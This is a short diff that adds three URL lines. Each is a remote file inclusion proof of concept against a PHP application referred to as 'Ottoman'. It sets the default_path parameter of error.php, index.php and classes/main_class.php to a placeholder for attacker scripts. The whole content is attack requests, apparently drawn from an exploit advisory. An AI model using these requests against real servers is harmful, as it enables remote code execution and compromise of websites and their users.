@@ -1,0 +1,3 @@
+http://www.example.com/[Ottomanpath]/error.php?default_path=[evil_scripts]
+http://www.example.com/[Ottomanpath]/index.php?default_path=[evil_scripts]
+http://www.example.com/[Ottomanpath]/classes/main_class.php?default_path=[evil_scripts]
